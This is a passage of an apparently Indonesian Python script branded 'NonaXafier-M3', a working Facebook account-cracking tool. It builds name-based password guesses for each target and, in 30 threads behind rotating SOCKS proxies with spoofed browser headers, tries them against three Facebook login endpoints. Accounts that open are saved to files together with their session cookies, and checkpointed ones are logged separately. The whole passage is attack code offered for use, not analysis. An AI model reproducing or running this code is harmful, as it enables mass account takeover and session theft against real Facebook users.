	elif tod in ['2','02']:
		method.append('async')
	elif tod in ['3','03']:
		method.append('graph')
	else:
		print(f'{P}[{H}!{P}] 𝙸𝚗𝚙𝚞𝚝 𝚢𝚊𝚗𝚐 𝚋𝚎𝚗𝚊𝚛 𝚋𝚘𝚜𝚜𝚚𝚞𝚑')
		exit()
	pwplus=input(f"{P}[{H}?{P}] Tambahkan Password Manual y/t : ") 
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku = input(f'{P}[{H}?{P}] 𝑰𝒏𝒑𝒖𝒕 : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	passwrd() 		
### SETTING PASSWORD ####
def passwrd():
	print(f'{H}━━'* 26)
	wa.print(f'\r[white]𝚃𝚘𝚝𝚊𝚕 𝙸𝚍𝚜 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 𝙲𝚘𝚕𝚕𝚎𝚌𝚝: [green] '+str(len(id)))
	wa.print(f'\r[white]𝙿𝚕𝚊𝚢 𝙰𝚒𝚛𝚙𝚕𝚊𝚗𝚎 𝙼𝚘𝚍𝚎 𝙴𝚟𝚎𝚛𝚢 500 𝙸𝚍𝚣') 
	print(f'{H}━━'* 26)
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)					
			elif 'async' in method:
				pool.submit(krek,idf,pwv)
			elif 'graph' in method:
				pool.submit(asyin,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
### ASYNC METHOD ###
def asyin(idf,pwv):
	global loop,ok,cp
	bo = random.choice([M,K,H,B,P])
	bt = random.choice([M,P,B,K,Z,U,O,N])
	sys.stdout.write(f"\r{bt}[ {bo}NonaXafier-M3 {bt}] {bo}[ {bt}{len(id)} {bo}] {bt}[ {bo}{loop} {bt}] {bo}[ OK-{H}{ok} {bo} ] {bt}[ CP-{K}{cp} {P} {bt}]")
	sys.stdout.flush()
	rr = random.randint
	rc = random.choice
	ua = rc(ugen)
	meki = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9","es-LA,es;q=0.9","es-MX,es;q=0.9"])
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1213367759399923&kid_directed_site=0&app_id=1213367759399923&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D1213367759399923%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_223769%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6f1c5adf-a56d-475b-9f0b-58f134b315c0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_223769%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1213367759399923&kid_directed_site=0&app_id=1213367759399923&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D1213367759399923%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_223769%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6f1c5adf-a56d-475b-9f0b-58f134b315c0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_223769%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1213367759399923&auth_token=5ea50c2d79f9b32678138f507111fc2d&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D1213367759399923%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_223769%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6f1c5adf-a56d-475b-9f0b-58f134b315c0%26tp%3Dunspecified&refsrc=deprecated&app_id=1213367759399923&cancel=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_223769%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r{P}├──˚ ͟͟͞͞➳ Email  : {H}{idf}{P} | PW  : {H}{pw}{P}\n{P}└──˚ ͟͟͞͞➳  KUKIS : {U}{kuki}{P}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f'\r{P}├──˚ ͟͟͞͞➳ Email  : {K}{idf}{P} | PW : {K}{pw}{P}\n{P}└──˚ ͟͟͞͞➳ User Agent  : {M}{ua}{P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
### VALIDATE METHOD ###
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([M,K,H,B,P])
	sys.stdout.write(f"\r               {bo}PROSES{P}|{P}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}")
	sys.stdout.flush()
	rr = random.randint
	rc = random.choice
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			wibu = ses.get(f'https://free.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated').text
			data = {
					"lsd": re.search('name="lsd" value="(.*?)"',str(wibu)).group(1),
					"jazoest": re.search('name="jazoest" value="(.*?)"', str(wibu)).group(1),
					"uid": idf,
					"next": f"https://free.facebook.com/login/save-device/",
					"flow": "login_no_pin",
					"pass": pw
						}
			wibu_head = {
				'Host': 'm.facebook.com',
				'cache-control': 'max-age=0',
				'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="115", "Google Chrome";v="115"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'upgrade-insecure-requests': '1',
				'origin': 'https://m.facebook.com',
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent': ua,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'sec-fetch-site': 'same-origin',
				'x-requested-with': 'com.alohamobile.browser.lite',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'document',
				'referer': f'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated',
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}
			post = ses.post(f"https://free.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=wibu_head,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f'\r{P}├──˚ ͟͟͞͞➳ Email  : {H}{idf}{P} | PW  : {H}{pw}{P}\n{P}└──˚ ͟͟͞͞➳  KUKIS : {U}{kuki}{P}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f'\r{P}├──˚ ͟͟͞͞➳ Email  : {K}{idf}{P} | PW : {K}{pw}{P}\n{P}└──˚ ͟͟͞͞➳ User Agent  : {M}{ua}{P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
### VALIDATE METHOD 2 ###	
def krek(idf,pwv):
	global loop,ok,cp
	bo = random.choice([M,K,H,B,P])
	sys.stdout.write(f"\r               {bo}PROSES{P}|{P}{loop}{P}|{H}OK-{ok}{P}|{K}CP-{cp}")
	sys.stdout.flush()
	rr = random.randint
	rc = random.choice
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			urll = ses.get('https://d.facebook.com/login/device-based/password/?uid='+usermu+'&flow=login_no_pin&next=https%3A%2F%2Fd.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2249012795165840%26cbt%3D1694435386188%26e2e%3D%257B%2522init%2522%253A1694435386188%257D%26ies%3D0%26sdk%3Dandroid-15.2.0%26sso%3Dchrome_custom_tab%26nonce%3D18c90fd8-e15a-45bb-bf31-5cc576b0633f%26scope%3Dpublic_profile%252Cemail%252Copenid%26state%3D%257B%25220_auth_logger_id%2522%253A%2522f2d234a2-eb66-4b31-8d08-644ec95d8bf9%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522aq34244k9fvtiesrg6u8%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb2249012795165840%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DPvWrOLgIJ6BczgP-5Op_qfcHuFMphuz_j3_q3UH-TLI%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df2d234a2-eb66-4b31-8d08-644ec95d8bf9%26tp%3Dunspecified&cancel_url=fb2249012795165840%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522f2d234a2-eb66-4b31-8d08-644ec95d8bf9%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522aq34244k9fvtiesrg6u8%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
			data = {
				'lsd': re.search('name="lsd" value="(.*?)"',str(urll.text)).group(1), 
				'jazoest': re.search('name="jazoest" value="(.*?)"',str(urll.text)).group(1), 
				'uid': usermu, 
				'next': 'https://d.facebook.com/v15.0/dialog/oauth?cct_prefetching=0&client_id=2249012795165840&cbt=1694435386188&e2e=%7B%22init%22%3A1694435386188%7D&ies=0&sdk=android-15.2.0&sso=chrome_custom_tab&nonce=18c90fd8-e15a-45bb-bf31-5cc576b0633f&scope=public_profile%2Cemail%2Copenid&state=%7B%220_auth_logger_id%22%3A%22f2d234a2-eb66-4b31-8d08-644ec95d8bf9%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22aq34244k9fvtiesrg6u8%22%7D&code_challenge_method=S256&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fb2249012795165840%3A%2F%2Fauthorize%2F&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&code_challenge=PvWrOLgIJ6BczgP-5Op_qfcHuFMphuz_j3_q3UH-TLI&ret=login&fbapp_pres=0&logger_id=f2d234a2-eb66-4b31-8d08-644ec95d8bf9&tp=unspecified', 
				'flow': 'login_no_pin', 
				'pass': pw,
			}
			head = {
				'Host': 'd.facebook.com',
				'content-length': '1075',
				'cache-control': 'max-age=0',
				'dpr': '3',
				'viewport-width': '980',
				'sec-ch-ua': f'"Not.A/Brand";v="{str(rr(8,99))}", "Chromium";v="{str(rr(90,116))}", "Google Chrome";v="{str(rr(90,116))}"',
				'sec-ch-ua-mobile': '?1', 
				'sec-ch-ua-platform': '"Android"',
				'sec-ch-prefers-color-scheme': 'light',
				'upgrade-insecure-requests': '1',
				'origin': 'https://d.facebook.com',
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent': mama,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'document',
				'referer': 'https://d.facebook.com/login/device-based/password/?uid='+usermu+'&flow=login_no_pin&next=https%3A%2F%2Fd.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2249012795165840%26cbt%3D1694435386188%26e2e%3D%257B%2522init%2522%253A1694435386188%257D%26ies%3D0%26sdk%3Dandroid-15.2.0%26sso%3Dchrome_custom_tab%26nonce%3D18c90fd8-e15a-45bb-bf31-5cc576b0633f%26scope%3Dpublic_profile%252Cemail%252Copenid%26state%3D%257B%25220_auth_logger_id%2522%253A%2522f2d234a2-eb66-4b31-8d08-644ec95d8bf9%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522aq34244k9fvtiesrg6u8%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb2249012795165840%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DPvWrOLgIJ6BczgP-5Op_qfcHuFMphuz_j3_q3UH-TLI%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Df2d234a2-eb66-4b31-8d08-644ec95d8bf9%26tp%3Dunspecified&cancel_url=fb2249012795165840%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522f2d234a2-eb66-4b31-8d08-644ec95d8bf9%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522aq34244k9fvtiesrg6u8%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
				'accept-encoding': 'gzip, deflate,br', 
				'accept-language': ggak}
			po = ses.post(f'https://d.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID', data=data, headers=head, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}├──˚ ͟͟͞͞➳ Email  : {H}{idf}{P} | PW  : {H}{pw}{P}\n{P}└──˚ ͟͟͞͞➳  KUKIS : {U}{kuki}{P}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print(f'\r{P}├──˚ ͟͟͞͞➳ Email  : {K}{idf}{P} | PW : {K}{pw}{P}\n{P}└──˚ ͟͟͞͞➳ User Agent  : {M}{ua}{P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
            #===========SYSTEM CONTROL===========#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

